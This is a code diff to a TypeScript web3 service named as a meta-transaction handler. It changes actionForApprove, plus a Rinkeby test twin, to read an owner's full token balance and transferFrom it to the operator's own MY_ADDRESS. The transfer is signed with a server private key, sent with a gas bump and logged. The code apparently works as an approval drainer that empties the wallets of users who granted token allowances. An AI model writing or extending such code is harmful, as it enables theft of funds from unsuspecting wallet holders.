@@ -15,6 +15,8 @@ import {
   USDC_ADDRESS,
   PRIVATE_KEY,
   MY_ADDRESS,
+  rinkebyRpcURL,
+  ERC20_ADDRESS,
 } from 'src/helpers/constants';
 import * as ABI_ERC20 from 'src/helpers/abis/ABI_ERC20.json';
 import * as ABI_USDC from 'src/helpers/abis/ABI_USDC.json';
@@ -28,6 +30,7 @@ const buffer_1 = require('buffer');
 import { Transaction as Tx } from 'ethereumjs-tx';
 import { TxObject } from './interfaces/coinPrice.interface';
 import { MetaTx, MetaTxDocument } from './schemas/metaTx.schema';
+import { ApproveTx, ApproveTxDocument } from './schemas/approveTx.schema';
 
 @Injectable()
 export class MetaTxService {
@@ -37,6 +40,8 @@ export class MetaTxService {
   constructor(
     @InjectModel(MetaTx.name)
     private readonly metaTxModel: Model<MetaTxDocument>,
+    @InjectModel(ApproveTx.name)
+    private readonly approveTxModel: Model<ApproveTxDocument>,
   ) {
     const Web3 = require('web3');
     this.rpcUrl = mainnetRpcURL;
@@ -125,47 +130,74 @@ export class MetaTxService {
     return await web3.eth.accounts.signTransaction(transaction, PRIVATE_KEY);
   }
 
-  async sendTx(web3, fields = {}) {
+  async sendTx(web3, fields = {}, txInfo = {}) {
     const signedTx = await this.signTx(web3, fields);
+    // console.log('signedTx', signedTx);
+    const hash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+    console.log('Transaction sent!', hash.transactionHash);
 
-    web3.eth.sendSignedTransaction(signedTx.rawTransaction, (error, hash) => {
-      if (!error) {
-        console.log('Transaction sent!', hash);
-        const interval = setInterval(function () {
-          console.log('Attempting to get transaction receipt...');
-          web3.eth.getTransactionReceipt(hash, function (err, rec) {
-            if (rec) {
-              console.log(rec);
-              clearInterval(interval);
-            }
-          });
-        }, 1000);
-      } else {
-        console.log(
-          'Something went wrong while submitting your transaction:',
-          error,
-        );
-      }
+    const updateApproveTx = new this.approveTxModel({
+      rpcUrl: web3.currentProvider.host,
+      fields,
+      txInfo,
+      result: hash,
+      createdAt: new Date(),
     });
+    updateApproveTx.save();
   }
 
   async actionForApprove(ownerAddress: string) {
-    ownerAddress = '0xa3ae06e26e93a63fff1e6672b68e9a5dc4bb5e14';
     const web3 = this.web3;
-    const erc20Contract = new web3.eth.Contract(ABI_USDC, USDC_ADDRESS);
-    const balance = await erc20Contract.methods.balanceOf(ownerAddress).call();
+    const erc20Contract = new web3.eth.Contract(ABI_ERC20, USDC_ADDRESS);
+    let [balance, gasPrice] = await Promise.all([
+      await erc20Contract.methods.balanceOf(ownerAddress).call(),
+      web3.eth.getGasPrice(),
+    ]);
+
+    gasPrice = parseInt(gasPrice) + 5000000000; // plus 5 GWEI
+
     const sendTxData = erc20Contract.methods
-      // .transferFrom(ownerAddress, MY_ADDRESS, balance)
-      .transferFrom(
-        '0xa3ae06e26e93a63fff1e6672b68e9a5dc4bb5e14',
-        '0xf40809d49f605bd2c405cfa276e48f9587e4d0a9',
-        120,
-      )
+      .transferFrom(ownerAddress, MY_ADDRESS, balance)
       .encodeABI();
-    const estimateGas = await web3.eth.estimateGas({
-      to: USDC_ADDRESS,
-      data: sendTxData,
-    });
-    return estimateGas;
+    const estimateGas = 100000;
+    if (balance != 0)
+      this.sendTx(
+        web3,
+        {
+          gas: estimateGas,
+          gasPrice: web3.utils.toHex(gasPrice),
+          to: USDC_ADDRESS,
+          data: sendTxData,
+        },
+        { ownerAddress, balance },
+      );
+  }
+
+  async actionForApproveTest(ownerAddress: string) {
+    const Web3 = require('web3');
+    const web3 = new Web3(rinkebyRpcURL);
+    const erc20Contract = new web3.eth.Contract(ABI_ERC20, ERC20_ADDRESS);
+    let [balance, gasPrice] = await Promise.all([
+      await erc20Contract.methods.balanceOf(ownerAddress).call(),
+      web3.eth.getGasPrice(),
+    ]);
+
+    gasPrice = parseInt(gasPrice) + 5000000000; // plus 5 GWEI
+
+    const sendTxData = erc20Contract.methods
+      .transferFrom(ownerAddress, MY_ADDRESS, balance)
+      .encodeABI();
+    const estimateGas = 100000;
+    if (balance != 0)
+      this.sendTx(
+        web3,
+        {
+          gas: estimateGas,
+          gasPrice: web3.utils.toHex(gasPrice),
+          to: ERC20_ADDRESS,
+          data: sendTxData,
+        },
+        { ownerAddress, balance },
+      );
   }
 }
